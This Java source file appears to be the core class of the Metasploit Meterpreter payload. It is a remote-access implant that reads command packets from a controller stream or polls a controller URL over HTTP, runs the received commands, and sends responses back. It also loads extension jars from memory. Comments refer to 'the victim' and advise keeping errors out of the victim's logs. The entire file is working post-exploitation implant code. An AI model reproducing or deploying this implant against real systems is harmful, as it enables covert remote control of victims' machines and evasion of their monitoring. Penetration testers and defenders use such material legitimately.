package com.metasploit.meterpreter;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.EOFException;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintStream;
import java.net.URL;
import java.net.URLClassLoader;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Random;
import java.util.jar.JarInputStream;

import com.metasploit.meterpreter.command.Command;
import com.metasploit.meterpreter.core.core_loadlib;

/**
 * Main meterpreter class. Responsible for keeping all the stuff together and for managing channels.
 * 
 * @author mihi
 */
public class Meterpreter {

	private static final int PACKET_TYPE_REQUEST = 0;
	private static final int PACKET_TYPE_RESPONSE = 1;

	private List/* <Channel> */channels = new ArrayList();
	private final CommandManager commandManager;
	private final DataOutputStream out;
	private final Random rnd = new Random();
	private final ByteArrayOutputStream errBuffer;
	private final PrintStream err;
	private final boolean loadExtensions;
	private List/* <byte[]> */tlvQueue = null;

	/**
	 * Initialize the meterpreter.
	 * 
	 * @param in
	 *            Input stream to read from
	 * @param rawOut
	 *            Output stream to write into
	 * @param loadExtensions
	 *            Whether to load (as a {@link ClassLoader} would do) the extension jars; disable this if you want to use your debugger's edit-and-continue feature or if you do not want to update the jars after each build
	 * @param redirectErrors
	 *            Whether to redirect errors to the internal error buffer; disable this to see the errors on the victim's standard error stream
	 * @throws Exception
	 */
	public Meterpreter(DataInputStream in, OutputStream rawOut, boolean loadExtensions, boolean redirectErrors) throws Exception {
		this.loadExtensions = loadExtensions;
		this.out = new DataOutputStream(rawOut);
		commandManager = new CommandManager();
		channels.add(null); // main communication channel?
		if (redirectErrors) {
			errBuffer = new ByteArrayOutputStream();
			err = new PrintStream(errBuffer);
		} else {
			errBuffer = null;
			err = System.err;
		}
		try {
			while (true) {
				int len = in.readInt();
				int ptype = in.readInt();
				if (ptype != PACKET_TYPE_REQUEST)
					throw new IOException("Invalid packet type: " + ptype);
				TLVPacket request = new TLVPacket(in, len - 8);
				TLVPacket response = executeCommand(request);
				if (response != null)
					writeTLV(PACKET_TYPE_RESPONSE, response);
			}
		} catch (EOFException ex) {
		}
		out.close();
		synchronized (this) {
			for (Iterator it = channels.iterator(); it.hasNext();) {
				Channel c = (Channel) it.next();
				if (c != null)
					c.close();
			}
		}
	}

	/**
	 * Write a TLV packet to this meterpreter's output stream.
	 * 
	 * @param type
	 *            The type ({@link #PACKET_TYPE_REQUEST} or {@link #PACKET_TYPE_RESPONSE})
	 * @param packet
	 *            The packet to send
	 */
	private synchronized void writeTLV(int type, TLVPacket packet) throws IOException {
		byte[] data = packet.toByteArray();
		if (tlvQueue != null) {
			ByteArrayOutputStream baos = new ByteArrayOutputStream();
			DataOutputStream dos = new DataOutputStream(baos);
			dos.writeInt(data.length + 8);
			dos.writeInt(type);
			dos.write(data);
			tlvQueue.add(baos.toByteArray());
			return;
		}
		synchronized (out) {
			out.writeInt(data.length + 8);
			out.writeInt(type);
			out.write(data);
			out.flush();
		}
	}

	/**
	 * Execute a command request.
	 * 
	 * @param request
	 *            The request to execute
	 * @return The response packet to send back
	 */
	private TLVPacket executeCommand(TLVPacket request) throws IOException {
		TLVPacket response = new TLVPacket();
		String method = request.getStringValue(TLVType.TLV_TYPE_METHOD);
		if (method.equals("core_switch_url")) {
			String url = request.getStringValue(TLVType.TLV_TYPE_STRING);
			int sessionExpirationTimeout = request.getIntValue(TLVType.TLV_TYPE_UINT);
			int sessionCommunicationTimeout = request.getIntValue(TLVType.TLV_TYPE_LENGTH);
			pollURL(new URL(url), sessionExpirationTimeout, sessionCommunicationTimeout);
			return null;
		} else if (method.equals("core_shutdown")) {
			return null;
		}
		response.add(TLVType.TLV_TYPE_METHOD, method);
		response.add(TLVType.TLV_TYPE_REQUEST_ID, request.getStringValue(TLVType.TLV_TYPE_REQUEST_ID));
		Command cmd = commandManager.getCommand(method);
		int result;
		try {
			result = cmd.execute(this, request, response);
		} catch (Throwable t) {
			t.printStackTrace(getErrorStream());
			result = Command.ERROR_FAILURE;
		}
		response.add(TLVType.TLV_TYPE_RESULT, result);
		return response;
	}
	
	/**
	 * Poll from a given URL until a shutdown request is received.
	 * @param url
	 */
	private void pollURL(URL url, int sessionExpirationTimeout, int sessionCommunicationTimeout) throws IOException {
		synchronized (this) {
			tlvQueue = new ArrayList();
		}
		long deadline = System.currentTimeMillis() + sessionExpirationTimeout * 1000L;
		long commDeadline = System.currentTimeMillis() + sessionCommunicationTimeout * 1000L;
		final byte[] RECV = "RECV".getBytes("ISO-8859-1");
		while (System.currentTimeMillis() < Math.min(commDeadline, deadline)) {
			byte[] outPacket = null;
			synchronized (this) {
				if (tlvQueue.size() > 0)
					outPacket = (byte[]) tlvQueue.remove(0);
			}
			TLVPacket request = null;
			try {
				URLConnection uc = url.openConnection();
				uc.setDoOutput(true);
				OutputStream out = uc.getOutputStream();
				out.write(outPacket == null ? RECV : outPacket);
				out.close();
				DataInputStream in = new DataInputStream(uc.getInputStream());
				int len;
				try {
					len = in.readInt();
				} catch (EOFException ex) {
					len = -1;
				}
				if (len != -1) {
					int ptype = in.readInt();
					if (ptype != PACKET_TYPE_REQUEST)
						throw new RuntimeException("Invalid packet type: " + ptype);
					request = new TLVPacket(in, len - 8);
				}
				in.close();
				commDeadline = System.currentTimeMillis() + sessionCommunicationTimeout * 1000L;
			} catch (IOException ex) {
				ex.printStackTrace(getErrorStream());
				// URL not reachable
				if (outPacket != null) {
					synchronized (this) {
						tlvQueue.add(0, outPacket);
					}
				}
			}
			if (request != null) {
				TLVPacket response = executeCommand(request);
				if (response == null)
					break;
				writeTLV(PACKET_TYPE_RESPONSE, response);
			} else if (outPacket == null) {
				try {
					Thread.sleep(5000);
				} catch (InterruptedException ex) {
					// ignore
				}
			}
		}
		synchronized (this) {
			tlvQueue = new ArrayList();
		}
	}

	/**
	 * Get the command manager, used to register or lookup commands.
	 */
	public CommandManager getCommandManager() {
		return commandManager;
	}

	/**
	 * Register a new channel in this meterpreter. Used only by {@link Channel#Channel(Meterpreter, java.io.InputStream, OutputStream, java.io.InputStream)}.
	 * 
	 * @param channel
	 *            The channel to register
	 * @return The channel's ID.
	 */
	public synchronized int registerChannel(Channel channel) {
		channels.add(channel);
		return channels.size() - 1;
	}

	/**
	 * Used by {@link Channel#close()} to notify the meterpreter that the channel has been closed.
	 * 
	 * @param id
	 *            The channel's ID
	 */
	public synchronized void channelClosed(int id) {
		channels.set(id, null);
	}

	/**
	 * Obtain a channel for a given channel ID
	 * 
	 * @param id
	 *            The channel ID to look up
	 * @param throwIfNonexisting
	 *            Whether to throw an exception if the channel does not exist
	 * @return The channel, or <code>null</code> if the channel does not exist and it should not throw an exception
	 */
	public Channel getChannel(int id, boolean throwIfNonexisting) {
		Channel result = null;
		if (id < channels.size())
			result = (Channel) channels.get(id);
		if (result == null && throwIfNonexisting)
			throw new IllegalArgumentException("Channel " + id + " does not exist.");
		return result;
	}

	/**
	 * Return the error stream where all errors should be written to. Do <b>not</b> write to {@link System#out} or {@link System#err} as this might appear in the victim's error logs.
	 */
	public PrintStream getErrorStream() {
		return err;
	}

	/**
	 * Return the length of the currently buffered error stream content, or <code>-1</code> if no buffering is active.
	 */
	public int getErrorBufferLength() {
		if (errBuffer == null)
			return -1;
		return errBuffer.size();
	}
	
	/**
	 * Return the currently buffered error stream content, or <code>null</code> if no buffering is active.
	 */
	public byte[] getErrorBuffer() {
		if (errBuffer == null)
			return null;
		synchronized (errBuffer) {
			byte[] result = errBuffer.toByteArray();
			errBuffer.reset();
			return result;
		}
	}
	
	/**
	 * Send a request packet over this meterpreter.
	 * 
	 * @param packet
	 *            Packet parameters
	 * @param method
	 *            Method to invoke
	 */
	public void writeRequestPacket(String method, TLVPacket tlv) throws IOException {
		tlv.add(TLVType.TLV_TYPE_METHOD, method);
		char[] requestID = new char[32];
		for (int i = 0; i < requestID.length; i++) {
			requestID[i] = (char) ('A' + rnd.nextInt(26));
		}
		tlv.add(TLVType.TLV_TYPE_REQUEST_ID, new String(requestID));
		writeTLV(PACKET_TYPE_REQUEST, tlv);
	}

	/**
	 * Load an extension into this meterpreter. Called from {@link core_loadlib}.
	 * 
	 * @param data
	 *            The extension jar's content as a byte array
	 */
	public void loadExtension(byte[] data) throws Exception {
		ClassLoader classLoader = getClass().getClassLoader();
		if (loadExtensions) {
			URL url = MemoryBufferURLConnection.createURL(data, "application/jar");
			classLoader = new URLClassLoader(new URL[] { url }, classLoader);
		}
		JarInputStream jis = new JarInputStream(new ByteArrayInputStream(data));
		String loaderName = (String) jis.getManifest().getMainAttributes().getValue("Extension-Loader");
		ExtensionLoader loader = (ExtensionLoader) classLoader.loadClass(loaderName).newInstance();
		loader.load(commandManager);
	}
}
